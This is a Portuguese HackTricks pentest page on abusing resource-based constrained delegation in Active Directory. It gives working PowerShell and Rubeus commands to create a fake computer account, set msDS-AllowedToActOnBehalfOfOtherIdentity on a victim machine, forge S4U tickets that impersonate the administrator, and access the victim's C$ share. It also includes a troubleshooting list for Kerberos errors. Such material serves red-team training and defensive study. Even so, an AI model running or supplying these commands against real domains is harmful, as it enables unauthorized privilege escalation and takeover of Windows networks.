# Delegação Restrita Baseada em Recursos

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Conceitos Básicos de Delegação Restrita Baseada em Recursos

Isso é semelhante à [Delegação Restrita](constrained-delegation.md) básica, mas **em vez** de conceder permissões a um **objeto** para **fingir ser qualquer usuário em relação a um serviço**. A Delegação Restrita Baseada em Recursos **define no objeto quem pode fingir ser qualquer usuário em relação a ele**.

Neste caso, o objeto restrito terá um atributo chamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ com o nome do usuário que pode fingir ser qualquer outro usuário em relação a ele.

Outra diferença importante desta Delegação Restrita para as outras delegações é que qualquer usuário com **permissões de escrita sobre uma conta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) pode definir o _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Nas outras formas de Delegação, você precisava de privilégios de administrador de domínio).

### Novos Conceitos

Na Delegação Restrita foi dito que a bandeira **`TrustedToAuthForDelegation`** dentro do valor _userAccountControl_ do usuário é necessária para realizar um **S4U2Self**. Mas isso não é completamente verdade.\
A realidade é que mesmo sem esse valor, você pode realizar um **S4U2Self** contra qualquer usuário se você for um **serviço** (tiver um SPN), mas, se você **tiver `TrustedToAuthForDelegation`**, o TGS retornado será **Encaminhável** e se você **não tiver** essa bandeira, o TGS retornado **não** será **Encaminhável**.

No entanto, se o **TGS** usado em **S4U2Proxy** **NÃO for Encaminhável** tentar abusar de uma **Delegação Restrita básica** **não funcionará**. Mas se você estiver tentando explorar uma **delegação restrita baseada em recursos, funcionará** (isso não é uma vulnerabilidade, é um recurso, aparentemente).

### Estrutura de Ataque

> Se você tiver **privilégios equivalentes de escrita** sobre uma **conta de Computador**, você pode obter **acesso privilegiado** nessa máquina.

Suponha que o atacante já tenha **privilégios equivalentes de escrita sobre o computador da vítima**.

1. O atacante **compromete** uma conta que tenha um **SPN** ou **cria um** (“Serviço A”). Observe que **qualquer** _Usuário Administrador_ sem nenhum outro privilégio especial pode **criar** até 10 **objetos de Computador (**_**MachineAccountQuota**_**)** e definir um **SPN**. Portanto, o atacante pode simplesmente criar um objeto de Computador e definir um SPN.
2. O atacante **abusa de seu privilégio de ESCRITA** sobre o computador da vítima (ServiçoB) para configurar **delegação restrita baseada em recursos para permitir que o ServiçoA finja ser qualquer usuário** em relação a esse computador da vítima (ServiçoB).
3. O atacante usa o Rubeus para realizar um **ataque S4U completo** (S4U2Self e S4U2Proxy) do Serviço A para o Serviço B para um usuário **com acesso privilegiado ao Serviço B**.
1. S4U2Self (da conta comprometida/criada com SPN): Solicita um **TGS do Administrador para mim** (Não Encaminhável).
2. S4U2Proxy: Usa o **TGS não Encaminhável** do passo anterior para solicitar um **TGS** do **Administrador** para o **host da vítima**.
3. Mesmo se você estiver usando um TGS não Encaminhável, como você está explorando a delegação restrita baseada em recursos, funcionará.
4. O atacante pode **passar o ticket** e **fingir ser** o usuário para obter **acesso ao ServiçoB da vítima**.

Para verificar o _**MachineAccountQuota**_ do domínio, você pode usar:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um Objeto de Computador

Você pode criar um objeto de computador dentro do domínio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurando a **Delegação Restrita Baseada em Recursos**

**Usando o módulo PowerShell do Active Directory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando o powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando um ataque S4U completo

Primeiramente, criamos o novo objeto Computador com a senha `123456`, então precisamos do hash dessa senha:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso irá imprimir os hashes RC4 e AES para essa conta.\
Agora, o ataque pode ser realizado:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets apenas pedindo uma vez usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Note que os usuários têm um atributo chamado "**Não pode ser delegado**". Se um usuário tiver esse atributo como Verdadeiro, você não poderá se passar por ele. Essa propriedade pode ser vista dentro do bloodhound.
{% endhint %}

### Acessando

O último comando executará o **ataque S4U completo e injetará o TGS** do Administrador no host da vítima na **memória**.\
Neste exemplo, foi solicitado um TGS para o serviço **CIFS** do Administrador, então você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes tickets de serviço

Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).

## Erros do Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que o kerberos está configurado para não usar DES ou RC4 e você está fornecendo apenas o hash RC4. Forneça para o Rubeus pelo menos o hash AES256 (ou apenas forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do do DC e o kerberos não está funcionando corretamente.
* **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para fazer login. Você pode ter esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Isso pode significar:
  * O usuário que você está tentando se passar não pode acessar o serviço desejado (porque você não pode se passar por ele ou porque ele não tem privilégios suficientes)
  * O serviço solicitado não existe (se você pedir um ticket para winrm mas o winrm não estiver em execução)
  * O computador falso criado perdeu seus privilégios sobre o servidor vulnerável e você precisa devolvê-los.

## Referências

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
